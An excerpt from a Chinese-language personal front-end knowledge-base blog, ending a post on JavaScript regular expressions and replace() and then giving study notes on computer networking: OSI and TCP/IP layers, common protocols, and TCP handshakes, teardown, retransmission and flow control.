<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">var replace = function()&#123;</span><br><span class="line">    var text = &quot;javascript Tutorial&quot;;</span><br><span class="line">    console.log(text.replace(/\S/ig, &#x27;($&amp;)&#x27;));</span><br><span class="line">&#125;()</span><br><span class="line">var replace = function()&#123;</span><br><span class="line">    var name = &quot;Doe, John&quot;;</span><br><span class="line">    console.log(name.replace(/(\w+)\s*, \s*(\w+)/, &quot;$2 $1&quot;));</span><br><span class="line">    var str = &#x27;aaa bbb ccc&#x27;;</span><br><span class="line">    console.log(str.replace(/\b\w+\b/g, function(word)&#123;</span><br><span class="line"> return word.substring(0,1).toUpperCase()+word.substring(1);&#125;</span><br><span class="line"> ))</span><br><span class="line"></span><br><span class="line">&#125;()</span><br></pre></td></tr></table></figure>

<p>月日年变日月年</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;04-22-2018&quot;.replace(/(?&lt;month&gt;\d&#123;2&#125;)-(?&lt;day&gt;\d&#123;2&#125;)-(?&lt;year&gt;\d&#123;4&#125;)/, (...args) =&gt; &#123;</span><br><span class="line">  const groups = args.slice(-1)[0]</span><br><span class="line">  const &#123;day, month, year&#125; = groups</span><br><span class="line">  return `$&#123;day&#125;-$&#123;month&#125;-$&#123;year&#125;`</span><br><span class="line">&#125;) // &quot;25-04-2017&quot;</span><br></pre></td></tr></table></figure>

<p>题目，移除所有标签，只留下 innerText!</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var html = &quot;&lt;p&gt;&lt;a href=&#x27;http://www.cnblogs.com/rubylouvre/&#x27;&gt;Ruby Louvre&lt;/a&gt;by &lt;em&gt;正则表达式&lt;/em&gt;&lt;/p&gt;&quot;;</span><br><span class="line">var text = html.replace(/&lt;(.|\s)*?&gt;/g, &quot;&quot;);</span><br><span class="line">alert(text)//Ruby Louvreby 正则表达式</span><br></pre></td></tr></table></figure>

<h2 id="官方教程"><a href="#官方教程" class="headerlink" title="官方教程"></a>官方教程</h2><p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/dotnet/standard/base-types/regular-expression-language-quick-reference">微软：.NET 正则表达式</a><br><a target="_blank" rel="noopener" href="https://msdn.microsoft.com/zh-cn/library/system.text.regularexpressions.regex.aspx">MSDN</a><br><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/regexp/zoxa1pq7.html">W3CSCHOOL 正则表达式基本语法</a></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a target="_blank" rel="noopener" href="http://www.cnblogs.com/deerchao/archive/2006/08/24/zhengzhe30fengzhongjiaocheng.html">正则表达式 30 分钟入门教程</a><br><a target="_blank" rel="noopener" href="http://www.cnblogs.com/dolphinX/p/3486214.html">JavaScript 正则表达式上——基本语法</a><br><a target="_blank" rel="noopener" href="http://www.cnblogs.com/dolphinX/p/3486136.html">JavaScript 正则表达式下——相关方法</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/xbfengyu/article/details/53150773">js 正则表达式/replace 替换变量方法</a><br><a target="_blank" rel="noopener" href="http://www.jb51.net/article/77687.htm">65 条最常用正则表达式 你要的都在这里了</a><br><a target="_blank" rel="noopener" href="http://www.w3school.com.cn/jsref/jsref_replace.asp">JavaScript replace() 方法</a><br><a target="_blank" rel="noopener" href="http://www.w3school.com.cn/jsref/jsref_split.asp">JavaScript split() 方法</a>、<br><a target="_blank" rel="noopener" href="http://www.cnblogs.com/rubylouvre/archive/2010/03/09/1681222.html">javascript 正则表达式</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ziyunfei/p/6761413.html">JS 正则中的命名捕获分组</a><br><a target="_blank" rel="noopener" href="http://www.jb51.net/article/88742.htm">javascript 正则表达式中分组详解</a><br><a target="_blank" rel="noopener" href="https://www.w3cplus.com/html5/html5-form-validation-with-the-pattern-attribute.html">pattern–HTML5 的表单验证属性</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/83876910?utm_source=qq&utm_medium=social&utm_oi=549346247203553280">https://zhuanlan.zhihu.com/p/83876910?utm_source=qq&amp;utm_medium=social&amp;utm_oi=549346247203553280</a><br><a target="_blank" rel="noopener" href="https://juejin.cn/post/7021672733213720613?utm_source=gold_browser_extension">https://juejin.cn/post/7021672733213720613?utm_source=gold_browser_extension</a><br><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/dotnet/standard/base-types/regular-expression-language-quick-reference?redirectedfrom=MSDN">https://docs.microsoft.com/zh-cn/dotnet/standard/base-types/regular-expression-language-quick-reference?redirectedfrom=MSDN</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://catcherinsky.github.io/2021/08/25/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="CatcherInSky">
      <meta itemprop="description" content="CatcherInSky的前端知识库">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Knowlegde Bases of CatcherInSky">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/08/25/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" class="post-title-link" itemprop="url">计算机网络</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-08-25 10:57:29" itemprop="dateCreated datePublished" datetime="2021-08-25T10:57:29+08:00">2021-08-25</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-02-14 19:41:06" itemprop="dateModified" datetime="2022-02-14T19:41:06+08:00">2022-02-14</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><h3 id="集线器、网桥、交换机、路由器"><a href="#集线器、网桥、交换机、路由器" class="headerlink" title="集线器、网桥、交换机、路由器"></a>集线器、网桥、交换机、路由器</h3><ul>
<li>网线是物理层的硬件</li>
<li>集线器（Hub）是<strong>物理层</strong>的硬件，连接所有的线路，广播所有信息</li>
<li>网桥（Bridge）是<strong>数据链路层</strong>的硬件。网桥隔离两个端口，不同的端口形成单独的冲突域，减少网内冲突。网桥在不同或相同类型的 LAN 之间存储并转发数据帧，根据 MAC 头部来决定转发端口，显然是数据链路层的设备</li>
<li>交换机（Switch）是<strong>数据链路层</strong>的硬件，相当于多端口的网桥。交换机内部存储 MAC 表，只会将数据帧发送到指定的目的地址</li>
<li>路由器（Router）是<strong>网络层</strong>的硬件，根据 IP 地址进行寻址，不同子网间的数据传输隔离</li>
</ul>
<p>​</p>
<h3 id="协议数据单元"><a href="#协议数据单元" class="headerlink" title="协议数据单元"></a>协议数据单元</h3><p>协议数据单元(Prtocol data unit)，指对等层协议之间交换的信息单元。PDU 再往上就是数据（data）。<br>在 OSI 模型里，PDU 和底下四层相关：</p>
<ul>
<li>物理层———比特（Bit）</li>
<li>数据链路层———帧（Frame）</li>
<li>网络层———分组、数据包（Packet）</li>
<li>传输层———数据段（Segment）</li>
<li>第五层或以上为数据（data）。也有一种说法是，应用层的信息称为消息、报文（message），表示完整的信息。</li>
</ul>
<h3 id="MSL、TTL、RTT"><a href="#MSL、TTL、RTT" class="headerlink" title="MSL、TTL、RTT"></a>MSL、TTL、RTT</h3><ul>
<li>MSL（Maximum segment lifetime）：报文最大生存时间。它是任何 TCP 报文在网络上存在的最长时间，超过这个时间报文将被丢弃。实际应用中常用的设置是 30 秒，1 分钟和 2 分钟。TCP 四次挥手时，需要在 TIME-WAIT 状态等待 2MSL 的时间，可以保证本次连接产生的所有报文段都从网络中消失。</li>
<li>TTL（Time to live）：IP 数据报在网络中可以存活的总跳数，称为“生存时间”，但并不是一个真正的时间。该域由源主机设置初始值，每经过一个路由器，跳数减 1，如果减至 0，则丢弃该数据包，同时发送 ICMP 报文通知源主机。取值范围 1-255，如果设置的 TTL 值小于传输过程中需要经过的路由器数量，则该数据包在传输中就会被丢弃。</li>
<li>RTT（Round trip time）：客户端到服务端往返所花时间。RTT 受网络传输拥塞的变化而变化，由 TCP <strong>动态地估算</strong>。</li>
</ul>
<h2 id="协议栈"><a href="#协议栈" class="headerlink" title="协议栈"></a>协议栈</h2><h3 id="OSI-参考模型"><a href="#OSI-参考模型" class="headerlink" title="OSI 参考模型"></a>OSI 参考模型</h3><ul>
<li>应用层：应用层协议定义的是应用进程间的通信和交互的规则，不同的网络应用需要不同的应用层协议</li>
<li>表示层：把数据转换为能与接收者的系统格式兼容并适合传输的格式</li>
<li>会话层：在数据传输中设置和维护电脑网络中两台电脑之间的通信连接</li>
<li>传输层：向两台主机进程之间的通信提供通用的数据传输服务</li>
<li>网络层：基于网络层地址（IP 地址）进行不同网络系统间的路径选择</li>
<li>数据链路层：在不可靠的物理介质上提供可靠的传输</li>
<li>物理层：在局域网上透明地传送比特，尽可能屏蔽掉具体传输介质和物理设备的差异</li>
</ul>
<p>​</p>
<p>​</p>
<h3 id="TCP-IP-参考模型"><a href="#TCP-IP-参考模型" class="headerlink" title="TCP/IP 参考模型"></a>TCP/IP 参考模型</h3><ul>
<li>应用层：对应于 OSI 参考模型的应用层，为用户提供所需要的各种服务。定义的是应用进程间的通信和交互的规则，不同的网络应用需要不同的应用层协议。协议包括 SMTP、HTTP、FTP 等</li>
<li>传输层：对应于 OSI 参考模型的传输层，为应用层实体提供端到端的、通用的通信功能，<strong>保证了数据包的顺序传送及数据的完整性</strong>。“通用的”是指不同的应用可以使用同一个运输层服务。协议包括 TCP、UDP 等</li>
<li>网络层（或网际互联层）：对应于 OSI 参考模型的网络层，主要解决<strong>主机到主机的路由</strong>问题。协议包括 IP、ICMP 等</li>
<li>网络接入层：对应于 OSI 参考模型的物理层和数据链路层，负责相邻的物理节点间的可靠数据传输。协议包括 ARP、IEEE 802.2 等</li>
<li>将“网络接入层”进一步分为“数据链路层”与“物理层”</li>
</ul>
<p>​</p>
<p>将“网络接入层”进一步分为“数据链路层”与“物理层”，得到五层协议模型。各层的常见协议如下：</p>
<table>
<thead>
<tr>
<th>TCP/IP 协议层</th>
<th>协议</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>应用层</td>
<td><strong>HTTP</strong></td>
<td>超文本传输协议（HyperText Transfer Protocol）</td>
</tr>
<tr>
<td></td>
<td><strong>FTP</strong></td>
<td>文件传输协议（File Transfer Protocol）用于在客户端和服务器之间进行文件传输</td>
</tr>
<tr>
<td></td>
<td>SMTP</td>
<td>简单邮件传输协议（Simple Mail Transfer Protocol）是一个在网络上传输电子邮件的标准</td>
</tr>
<tr>
<td></td>
<td>TELNET</td>
<td>Telnet 是服务器远程登录控制的标准协议与主要方式</td>
</tr>
<tr>
<td></td>
<td><strong>DNS 53</strong></td>
<td>域名系统（Domain Name System）是域名和 IP 地址相互映射的分布式数据库</td>
</tr>
<tr>
<td></td>
<td><strong>SSH</strong></td>
<td>安全外壳协议（Secure Shell）是一种加密的网络传输协议，可在不安全的网络中为网络服务提供安全的传输环境</td>
</tr>
<tr>
<td></td>
<td><strong>DHCP</strong></td>
<td>动态主机配置协议（Dynamic Host Configuration Protocol）的主要作用是集中管理、动态分配 IP 地址，提升地址的使用率</td>
</tr>
<tr>
<td>传输层</td>
<td><strong>TCP</strong></td>
<td>传输控制协议（Transmission Control Protocol）是一种面向连接的、可靠的、基于字节流的传输层通信协议</td>
</tr>
<tr>
<td></td>
<td><strong>UDP</strong></td>
<td>用户数据报协议（User Datagram Protocol）是一个简单的、无连接的、不可靠的、面向数据报的通信协议</td>
</tr>
<tr>
<td>网络层</td>
<td><strong>IP</strong></td>
<td>网际协议（Internet Protocol）是用于分组交换数据网络的一种协议，功能包括寻址、路由、尽最大努力交付数据包</td>
</tr>
<tr>
<td></td>
<td>ICMP</td>
<td>互联网控制消息协议（Internet Control Message Protocol）用于返回通信环境的错误消息。traceroute 和 ping 都是基于 ICMP 消息实现的，traceroute 是通过发送含有特殊 TTL 的包，然后接收 ICMP 超时消息和目标不可达消息来实现的；ping 则是用 ICMP 的“Echo request (8)”和“Echo reply (0)”消息来实现的</td>
</tr>
<tr>
<td></td>
<td>IGMP</td>
<td>因特网组管理协议（Internet Group Management Protocol ）管理 IP 协议多播组成员</td>
</tr>
<tr>
<td></td>
<td>RIP</td>
<td>路由信息协议（Routing Information Protocol）是一种内部网关协议（IGP），是距离向量路由协议的一种实现</td>
</tr>
<tr>
<td></td>
<td>OSFP</td>
<td>开放式最短路径优先（Open Shortest Path First）是一种内部网关协议（IGP），使用 Dijkstra 算法计算最短路径，是链路状态路由协议的一种实现</td>
</tr>
<tr>
<td></td>
<td>BGP</td>
<td>边界网关协议（Border Gateway Protocol）是互联网上一个核心的去中心化自治路由协议，属于矢量路由协议。BGP 用于互联网上，将自治系统视作一个整体；每个自治系统使用 IGP（代表实现有 RIP 和 OSPF）进行路由</td>
</tr>
<tr>
<td>数据链路层</td>
<td><strong>ARP*</strong></td>
<td>地址解析协议（Address Resolution Protocol）通过 IP 寻找 MAC 地址</td>
</tr>
<tr>
<td></td>
<td>ARQ</td>
<td>自动重传请求（Automatic Repeat-reQuest）是一种错误纠正协议</td>
</tr>
<tr>
<td>物理层</td>
<td>IEEE802</td>
<td>IEEE 802 指 IEEE 标准中关于局域网和城域网的一系列标准，其中最广泛使用的有以太网、令牌环、无线局域网等</td>
</tr>
</tbody></table>
<p>ARP 协议：ARP 协议应该属于哪一层？一种说法是属于网络层，因为 IP 协议使用 ARP 协议；另一种说法是属于数据链路层，因为 MAC 地址是数据链路层的内容。在 OSI 模型中，ARP 协议属于链路层；而在 TCP/IP 模型中，ARP 协议属于网络层。<br>​</p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1629875728548-418e37ef-5084-4c81-91cb-db56a501050c.png#clientId=ucdf8c9fa-0386-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=535&id=u6c331c68&margin=%5Bobject%20Object%5D&originHeight=425&originWidth=586&originalType=url%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&taskId=u15b666f8-fc6d-4082-b98e-3fb2a145390&title=&width=738"><br>​</p>
<h3 id="异同"><a href="#异同" class="headerlink" title="异同"></a>异同</h3><h4 id="共同点"><a href="#共同点" class="headerlink" title="共同点"></a>共同点</h4><ul>
<li>都采用了层次结构的概念</li>
<li>都能够提供面向连接和无连接的通信服务机制</li>
</ul>
<h4 id="不同点"><a href="#不同点" class="headerlink" title="不同点"></a>不同点</h4><ul>
<li>OSI 采用了七层模型，而 TCP/IP 是四层</li>
<li>OSI 是一个在协议开发前设计的、有清晰概念的模型；TCP/IP 是先有协议集然后建立的、事实上得到广泛应用的弱模型，功能描述和实现细节混在一起</li>
<li>OSI 的网络层既提供面向连接的服务，又提供无连接的服务；TCP/IP 的网络层只提供无连接的网络服务</li>
<li>OSI 的传输层只提供面向连接的服务；TCP/IP 的传输层即提供面向连接的服务 TCP，也提供无连接的服务 UDP</li>
</ul>
<p>​</p>
<p>​</p>
<h2 id="IP"><a href="#IP" class="headerlink" title="IP"></a>IP</h2><p>IP 协议负责把数据从一台计算机通过网络发送到另一台计算机。（像快递的收货地址和发出地址）数据被分割成一小块一小块，然后通过 IP 包发送出去。由于互联网链路复杂，两台计算机之间经常有多条线路，因此，路由器就负责决定如何把一个 IP 包转发出去。IP 包的特点是按块发送，途径多个路由，但不保证能到达，也不保证顺序到达。<br>IP 协议基于底层物理网络的连通，且 IP 路由表在全球路由器里完成了同步<br><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1629876296598-a736c60c-52bb-4da9-b515-e7efa0ab22ce.png#clientId=ucdf8c9fa-0386-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=382&id=u64730bbe&margin=%5Bobject%20Object%5D&name=image.png&originHeight=382&originWidth=670&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&size=105722&status=done&style=none&taskId=u87908e71-c0c8-4e0a-b380-ee73f7d0691&title=&width=670" alt="image.png"><br>​</p>
<h2 id="TCP-UDP"><a href="#TCP-UDP" class="headerlink" title="TCP/UDP"></a>TCP/UDP</h2><p>TCP 协议则是建立在 IP 协议之上的。TCP 协议负责在两台计算机之间建立可靠连接，保证数据包按顺序到达。TCP 协议会通过握手建立连接，然后，对每个 IP 包编号，确保对方按顺序收到，如果包丢掉了，就自动重发。<br>​</p>
<h3 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h3><p><strong>传输控制协议 TCP（Transmission Control Protocol）</strong>是面向连接的，提供可靠交付，有流量控制，拥塞控制，提供全双工通信，面向字节流（把应用层传下来的报文看成字节流，把字节流组织成大小不等的数据块），每一条 TCP 连接只能是点对点的（一对一）。<br>​</p>
<h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4><ol>
<li><strong>面向连接</strong></li>
</ol>
<p>面向连接，是指发送数据之前必须在两端建立连接。建立连接的方法是“三次握手”，这样能建立可靠的连接。建立连接，是为数据的可靠传输打下了基础。<br>​</p>
<ol start="2">
<li><strong>单播</strong></li>
</ol>
<p>面向连接，是指发送数据之前必须在两端建立连接。建立连接的方法是“三次握手”，这样能建立可靠的连接。建立连接，是为数据的可靠传输打下了基础。<br>​</p>
<ol start="3">
<li><strong>面向字节流</strong></li>
</ol>
<p>TCP 不像 UDP 一样那样一个个报文独立地传输，而是在不保留报文边界的情况下以字节流方式进行传输。<br>​</p>
<ol start="4">
<li><strong>可靠传输</strong></li>
</ol>
<p>对于可靠传输，判断丢包，误码靠的是 TCP 的段编号以及确认号。TCP 为了保证报文传输的可靠，就给每个包一个序号，同时序号也保证了传送到接收端实体的包的按序接收。然后接收端实体对已成功收到的字节发回一个相应的确认(ACK)；如果发送端实体在合理的往返时延(RTT)内未收到确认，那么对应的数据（假设丢失了）将会被重传。<br>​</p>
<ol start="5">
<li><strong>拥塞控制</strong></li>
</ol>
<p>当网络出现拥塞的时候，TCP 能够减小向网络注入数据的速率和数量，缓解拥塞<br>​</p>
<ol start="6">
<li><strong>全双工通信</strong></li>
</ol>
<p>TCP 允许通信双方的应用程序在任何时候都能发送数据，因为 TCP 连接的两端都设有缓存，用来临时存放双向通信的数据。当然，TCP 可以立即发送一个数据段，也可以缓存一段时间以便一次发送更多的数据段（最大的数据段大小取决于 MSS）</p>
<h3 id="首部格式"><a href="#首部格式" class="headerlink" title="首部格式"></a>首部格式</h3><p><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1629880329444-2a05e937-cb52-4151-8270-5b6086dc3396.png#clientId=ucdf8c9fa-0386-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=869&id=u2a2395ee&margin=%5Bobject%20Object%5D&name=image.png&originHeight=869&originWidth=1219&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&size=376242&status=done&style=none&taskId=u50d9d002-d304-47cb-a6f0-e984f192aac&title=&width=1219" alt="image.png"></p>
<ul>
<li><strong>序号</strong> ：用于对字节流进行编号，例如序号为 301，表示第一个字节的编号为 301，如果携带的数据长度为 100 字节，那么下一个报文段的序号应为 401。</li>
<li><strong>确认号</strong> ：期望收到的下一个报文段的序号。例如 B 正确收到 A 发送来的一个报文段，序号为 501，携带的数据长度为 200 字节，因此 B 期望下一个报文段的序号为 701，B 发送给 A 的确认报文段中确认号就为 701。</li>
<li><strong>数据偏移</strong> ：指的是数据部分距离报文段起始处的偏移量，实际上指的是<strong>首部的长度</strong>。</li>
<li><strong>确认 ACK</strong> ：当 ACK=1 时确认号字段有效，否则无效。TCP 规定，在连接建立后所有传送的报文段都必须把 ACK 置 1。</li>
<li><strong>同步 SYN</strong> ：在连接建立时用来同步序号。当 SYN=1，ACK=0 时表示这是一个连接请求报文段。若对方同意建立连接，则响应报文中 SYN=1，ACK=1。</li>
<li><strong>终止 FIN</strong> ：用来释放一个连接，当 FIN=1 时，表示此报文段的发送方的数据已发送完毕，并要求释放连接。</li>
<li><strong>窗口</strong> ：窗口值作为接收方让发送方设置其发送窗口的依据。之所以要有这个限制，是因为接收方的数据缓存空间是有限的。</li>
</ul>
<h3 id="连接过程"><a href="#连接过程" class="headerlink" title="连接过程"></a>连接过程</h3><h4 id="三次握手"><a href="#三次握手" class="headerlink" title="三次握手"></a>三次握手</h4><p><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1629880814039-169490f2-cb83-4ba0-a8c4-51489e3664ab.png#clientId=ucdf8c9fa-0386-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=801&id=u0b9dff14&margin=%5Bobject%20Object%5D&name=image.png&originHeight=801&originWidth=1231&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&size=256949&status=done&style=none&taskId=uc11ad661-6195-42c2-ba8d-ead61626213&title=&width=1231" alt="image.png"><br>假设 A 为客户端，B 为服务器端。</p>
<ul>
<li>首先 B 处于 LISTEN（监听）状态，等待客户的连接请求。</li>
<li>A 向 B 发送连接请求报文，SYN=1，ACK=0，选择一个初始的序号 x。</li>
<li>B 收到连接请求报文，如果同意建立连接，则向 A 发送连接确认报文，SYN=1，ACK=1，确认号为 x+1，同时也选择一个初始的序号 y。</li>
<li>A 收到 B 的连接确认报文后，还要向 B 发出确认，确认号为 y+1，序号为 x+1。</li>
<li>B 收到 A 的确认后，连接建立。</li>
</ul>
<p>​</p>
<p><strong>三次握手的原因</strong><br>为什么不是两次握手？如果只有两次握手，那么服务端向客户端发送 SYN/ACK 报文后，就会认为连接建立。但是如果客户端没有收到报文，那么客户端是没有建立连接的。这就导致服务端会浪费资源。<br>第三次握手是为了防止失效的连接请求到达服务器，让服务器错误打开连接。<br>通信的双方要互相通知对方自己的初始化的 Sequence Number，也就上图中的 x 和 y。这个号要作为以后的数据通信的序号，以保证应用层接收到的数据不会因为网络上的传输的问题而乱序<br>客户端发送的连接请求如果在网络中滞留，那么就会隔很长一段时间才能收到服务器端发回的连接确认。客户端等待一个超时重传时间之后，就会重新请求连接。但是这个滞留的连接请求最后还是会到达服务器，如果不进行三次握手，那么服务器就会打开两个连接。如果有第三次握手，客户端会忽略服务器之后发送的对滞留连接请求的连接确认，不进行第三次握手，因此就不会再次打开连接。<br>​</p>
<h4 id="四次挥手"><a href="#四次挥手" class="headerlink" title="四次挥手"></a>四次挥手</h4><p><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1629881109934-6ec71627-1fa4-477e-8d29-193f5bec32c1.png#clientId=ucdf8c9fa-0386-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=601&id=u1f26be96&margin=%5Bobject%20Object%5D&name=image.png&originHeight=601&originWidth=892&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&size=264673&status=done&style=none&taskId=ua6b241ee-21e7-44f6-9038-a7fa357ae89&title=&width=892" alt="image.png"><br>以下描述不讨论序号和确认号，因为序号和确认号的规则比较简单。并且不讨论 ACK，因为 ACK 在连接建立之后都为 1。</p>
<ul>
<li>A 发送连接释放报文，FIN=1。</li>
<li>B 收到之后发出确认，此时 TCP 属于半关闭状态，B 能向 A 发送数据但是 A 不能向 B 发送数据。</li>
<li>当 B 不再需要连接时，发送连接释放报文，FIN=1。</li>
<li>A 收到后发出确认，进入 TIME-WAIT 状态，等待 2 MSL（最大报文存活时间）后释放连接。</li>
<li>B 收到 A 的确认后释放连接。</li>
<li>​</li>
</ul>
<p><strong>四次挥手的原因</strong><br>因为 TCP 是全双工的，一方关闭连接后，另一方还可以继续发送数据。所以四次挥手，将断开连接分成两个独立的过程。<br><strong>​</strong></p>
<p><strong>TIME_WAIT 原因</strong><br>客户端接收到服务器端的 FIN 报文后进入此状态，此时并不是直接进入 CLOSED 状态，还需要等待一个时间计时器设置的时间 2MSL。这么做有两个理由：</p>
<ul>
<li>确保最后一个确认报文能够到达。如果 B 没收到 A 发送来的确认报文，那么就会重新发送连接释放请求报文，A 等待一段时间就是为了处理这种情况的发生。</li>
<li>等待一段时间是为了让本连接持续时间内所产生的所有报文都从网络中消失，使得下一个新的连接不会出现旧的连接请求报文。</li>
</ul>
<p>​</p>
<p><strong>TIME_WAIT 数量太多</strong><br>TIME_WAIT 是主动断开连接的一方会进入的状态，但是如果在大并发的短链接下，TIME_WAIT 就会太多，这也会消耗很多系统资源。<br>​</p>
<p><strong>SYN Flood 攻击</strong><br>恶意的人就为此制造了 SYN Flood 攻击——给服务器发了一个 SYN 后，就下线了，于是服务器需要默认等 63s 才会断开连接，这样，攻击者就可以把服务器的 syn 连接的队列耗尽，让正常的连接请求不能处理。<br>​</p>
<h3 id="可靠传输"><a href="#可靠传输" class="headerlink" title="可靠传输"></a>可靠传输</h3><h4 id="检验和"><a href="#检验和" class="headerlink" title="检验和"></a>检验和</h4><p>通过检验和的方式，接收端可以检测出来数据是否有差错和异常，假如有差错就会直接丢弃 TCP 段，重新发送。TCP 在计算检验和时，会在 TCP 首部加上一个 12 字节的伪首部。检验和总共计算 3 部分：TCP 首部、TCP 数据、TCP 伪首部</p>
<h4 id="序列号-确认应答"><a href="#序列号-确认应答" class="headerlink" title="序列号/确认应答"></a>序列号/确认应答</h4><p>发送端发送信息给接收端，接收端会回应一个包，这个包就是应答包。只要发送端有一个包传输，接收端没有回应确认包（ACK 包），都会重发。<br>​</p>
<h4 id="超时重传"><a href="#超时重传" class="headerlink" title="超时重传"></a>超时重传</h4><p>如果一个已经发送的报文段在超时时间内没有收到确认，那么就重传这个报文段。<br>一个报文段从发送再到接收到确认所经过的时间称为往返时间 RTT，加权平均往返时间 RTTs 计算如下：<br><a target="_blank" rel="noopener" href="https://camo.githubusercontent.com/4b31b44c078c2a6fe1354e38006e624c3ae5af66ad3f982d3d73e220a120ab98/68747470733a2f2f6c617465782e636f6465636f67732e636f6d2f6769662e6c617465783f525454733d28312d61292a2852545473292b612a525454"><img src="https://camo.githubusercontent.com/4b31b44c078c2a6fe1354e38006e624c3ae5af66ad3f982d3d73e220a120ab98/68747470733a2f2f6c617465782e636f6465636f67732e636f6d2f6769662e6c617465783f525454733d28312d61292a2852545473292b612a525454#crop=0&crop=0&crop=1&crop=1&from=url&id=IppMq&margin=%5Bobject%20Object%5D&originHeight=19&originWidth=295&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&title="></a></p>
<p>其中，0 ≤ a ＜ 1，RTTs 随着 a 的增加更容易受到 RTT 的影响。<br>超时时间 RTO 应该略大于 RTTs，TCP 使用的超时时间计算如下：<br><a target="_blank" rel="noopener" href="https://camo.githubusercontent.com/ae415414727a193c7c23b73199e5ca6c1caa84df9822bf02f8483f8a359605e0/68747470733a2f2f6c617465782e636f6465636f67732e636f6d2f6769662e6c617465783f52544f3d525454732b342a5254545f64"><img src="https://camo.githubusercontent.com/ae415414727a193c7c23b73199e5ca6c1caa84df9822bf02f8483f8a359605e0/68747470733a2f2f6c617465782e636f6465636f67732e636f6d2f6769662e6c617465783f52544f3d525454732b342a5254545f64#crop=0&crop=0&crop=1&crop=1&from=url&id=W0ccJ&margin=%5Bobject%20Object%5D&originHeight=16&originWidth=205&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&title="></a></p>
<p>其中 RTTd 为偏差的加权平均值。</p>
<h3 id="流量控制（Flow-Control）"><a href="#流量控制（Flow-Control）" class="headerlink" title="流量控制（Flow Control）"></a>流量控制（Flow Control）</h3><h4 id="滑动窗口（Sliding-Window）"><a href="#滑动窗口（Sliding-Window）" class="headerlink" title="滑动窗口（Sliding Window）"></a>滑动窗口（Sliding Window）</h4><p>窗口是缓存的一部分，用来暂时存放字节流。发送方和接收方各有一个窗口，接收方通过 TCP 报文段中的窗口字段告诉发送方自己还有多少缓冲区可以接收数据，发送方根据这个值和其它信息设置自己的窗口大小。</p>
<p>发送窗口内的字节都允许被发送，接收窗口内的字节都允许被接收。如果发送窗口左部的字节已经发送并且收到了确认，那么就将发送窗口向右滑动一定距离，直到左部第一个字节不是已发送并且已确认的状态；接收窗口的滑动类似，接收窗口左部字节已经发送确认并交付主机，就向右滑动接收窗口。</p>
